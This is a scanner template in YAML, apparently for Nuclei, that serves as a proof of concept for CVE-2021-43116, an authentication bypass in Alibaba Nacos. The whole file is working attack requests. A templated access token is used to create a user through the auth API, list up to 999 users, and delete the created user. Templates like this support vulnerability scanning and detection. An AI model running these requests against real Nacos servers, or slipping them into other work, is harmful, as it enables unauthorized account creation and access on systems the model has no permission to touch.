id: yaml-poc-alibaba-nacos-unauthorized_access-CVE-2021-43116
info:
  name: Yaml Poc Alibaba Nacos Unauthorized_Access Cve 2021 43116
  author: haiqing.chen
  severity: high
  description: 'Converted from xpoc: yaml-poc-alibaba-nacos-unauthorized_access-CVE-2021-43116'
  tags: unauth,cve
  classification:
    cve-id: CVE-2021-43116
  reference:
  - https://github.com/alibaba/nacos/issues/10060
  - https://blog.csdn.net/u012586326/article/details/129496783
  - https://nacos.io/zh-cn/blog/announcement-token-secret-key.html
http:
- method: POST
  path:
  - /{{nacosPath}}/auth/users/?username={{r1}}&password={{r2}}&accessToken={{token}}
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - create user ok!
- method: GET
  path:
  - /{{nacosPath}}/auth/users/?pageNo=1&pageSize=999&accessToken={{token}}
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: DELETE
  path:
  - /{{nacosPath}}/auth/users/?username={{r1}}&accessToken={{token}}
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - delete user ok!
